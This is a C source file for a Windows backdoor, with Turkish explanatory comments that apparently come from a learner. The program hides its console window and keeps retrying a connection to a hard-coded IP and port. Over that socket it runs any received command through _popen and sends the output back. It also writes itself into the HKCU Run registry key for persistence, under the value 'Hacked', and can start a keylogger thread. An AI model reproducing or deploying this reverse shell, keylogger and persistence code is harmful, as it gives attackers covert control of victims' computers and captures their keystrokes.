/*   
	Bir c kodunu windows penceresinde calistirmak istiyor isek WindowsAPI kullanmaliyiz, bunun icin windows.h tanimladiktan sonra main fonksiyon yerine WinMain fonksiyonunu kullanmaliyiz,
	Bu fonksiyonun 4 parametresi vardir. ilk olan HInstance 'Handle to instance' anlamina gelir. program  calistigi zaman isletim sisteminin programi tanimasini saglar (Windows functions-- for example  load icons or bitmaps..
	2.parametre olan hPrev anlamsizdir, 16bit windowstan kalmis..
	3.parametre  ise komut satiri argumanlarini programa dahil eder   as org text : pCmdLine contains the command-line arguments as a Unicode string.
	4.parametre nCmdShow ise pencerenin kucultulecegini buyultecegini ve normal sekilde gosterilecegini isaretleyen bir bayraktir  
	APIENTRY ise WINAPI' nin alias versiyonudur..
	**************************************************************
	tanimladigimiz karakter dizilerinin duzgun calismasi icin memset fonksiyonunu "bzero" olarak makroluyoruz
	bzero linuxta calisirken windowsta calismaz..
	
	
**************************************************************************************************************/
#include <stdio.h>  
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size)) // memset makro



int sock; //global socket variable


int bootRun()
{
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; // MAX_PATH 2064 byte
	DWORD pathLen = 0;
	
	pathLen = GetModuleFileName(NULL,szPath,MAX_PATH);
	if(pathLen == 0)
	{
		send(sock,err,sizeof(err),0);
		return -1;
	}
	
	HKEY NewVal;
	if(RegOpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal) != ERROR_SUCCESS)
	{
		send(sock,err,sizeof(err),0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if(RegSetValueEx(NewVal,TEXT("Hacked"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		send(sock,err,sizeof(err),0);
		return -1;
		
	
	}
	RegCloseKey(NewVal);
	send(sock,suc,sizeof(suc),0);
	return 0;
	



}




char * // bu fonksiyonu internetten aldik
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}



void Shell() {
	char buffer[1024]; // butun program akisi icin ayrilan tampon bellek
	char container[1024];
	char total_response[18384];


	while (1) { // break gelene kadar devam eden dongu
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response)); // program calisirken bizim bellegi duzenliyoruz
		recv(sock, buffer, 1024, 0); // sock, buffer bellegi uzerinde 1024 bytelik veri al, sondaki sifir FLAG

		if (strncmp("q", buffer, 1) == 0) // q girisiini yaptigimiz zaman program kapanacak strncmp 2 diziyi kontrol eden fonksiyondur..
		 {
			closesocket(sock);
			WSACleanup(); //standart temizlik fonksiyonu
			exit(0);
		}
		else if (strncmp("cd ",buffer, 3) == 0) //windowsta cd komutunu calistriyoruz,3 karakter alip cd den sonra bosluk birakiyoruz
		{
			chdir(str_cut(buffer,3,100)); //string cut, 3.karakterden sonra kesiyor    
		}
		else if(strncmp("persist",buffer,7) == 0)
		{
			bootRun();
		}
		else if (strncmp("keylog_start",buffer,12) == 0)
		{
			HANDLE thread = CreateThread(NULL,0,logg,NULL,0,NULL);
			goto jump:
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r"); // bir kanal olusturur vebir komut yurutur. buffer uzerinde read yetkisiyle bunu yapar
			while(fgets(container,1024,fp) != NULL) 
			{
				strcat(total_response, container); //2.parametredeki degerleri ilk parametrenin sonuna ekler. butun kaydi tutuyoruz
			}
			send(sock, total_response, sizeof(total_response), 0); //sockete elimizdeki butun yigini gonderiyoruz
			fclose(fp);
		}

	}

}

//Standart Windows API parametreleri
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	HWND stealth;// Handle to Window anlamina gelir, gizli parametresini tanimliyoruz ki programimiz arka planda calissin
	AllocConsole();//parametresiz bir winapi fonksiyonu, cagirilacak fonksiyon icin yeni bir konsol temin eder..
	stealth = FindWindowA("ConsoleWindowClass", NULL); //kullanilan en yukaridaki pencereyi hedef alir (ben oyle anladim)
 	// stealth = gizli
	ShowWindow(stealth, 0); // tam anlamiyla burada gizledik..

	struct sockaddr_in ServAddr; //socket programlama icin gereken struct ( sistemde tanimli gelir)
	unsigned short ServPort;  //unsigned tanimladik, cunku portumuz eksi deger olamaz..!
	char *ServIP;
	WSADATA wsaData; //The WSADATA structure contains information about the Windows Sockets implementation. (orijinal metin)

	ServIP = "192.168.112.132";
	ServPort = 50005; //SpeedGuide.com'da trojan service port olarak gozukuyor..

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { //The WSAStartup function initiates use of the Winsock DLL by a process | hata kontrolu
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0); //socket calistiriyoruz , AF_INET  IPv4 Internet protocols anlamina gelir,

	memset(&ServAddr, 0, sizeof(ServAddr)); // pointerin kafasina vuruyoruz kendine gelsin diye, seyid abim
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}
